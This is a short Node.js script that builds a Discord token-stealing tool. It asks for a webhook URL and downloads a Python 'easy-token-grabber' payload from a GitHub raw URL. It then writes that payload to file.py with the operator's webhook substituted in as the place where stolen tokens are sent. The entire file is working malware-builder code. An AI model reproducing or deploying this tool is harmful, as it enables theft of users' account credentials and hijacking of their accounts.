const rs = require("readline-sync");
const fs = require("fs");
const os = require("os");
const child_process = require('child_process').exec;
const superagent = require("superagent");
console.clear();

console.log(`\n\n                                    Bonjour ${os.hostname}                                    \n\n`);
console.log("                                        Dev by daskill                                                 ");
var webhook = rs.question("Webhook: ");
if (!webhook) console.clear(), console.log("Veuillez spécifier le webhook."), rs.question("Webhook: ");


superagent.get(webhook).then(res => {
    if (res.body == undefined) return console.log("Veuillez spécifier un URL valide."), process.exit();
    if (res.body.code == 10015) return console.log("Le webhook n'existe pas!"), process.exit();
});

superagent.get("https://raw.githubusercontent.com/Hugi1410/easy-token-grabber/main/codes.py").then(response => {



    fs.writeFileSync('file.py', response.text, function(err, data) {
        if (err) return console.log(err);
        if (data) return console.log('File.py créé avec succès!');
    })

    fs.readFile("file.py", 'utf8', function(err, data) {
        if (err) {
            return console.log(err);
        }
        var result = data.replace(/WEBHOOK_URL = 'dev by daskill'/g, 'WEBHOOK_URL' + '"' + webhook + '"');

        fs.writeFile("file.py", result, 'utf8', function(err) {
            if (err) return console.log(err);
        });
    });

});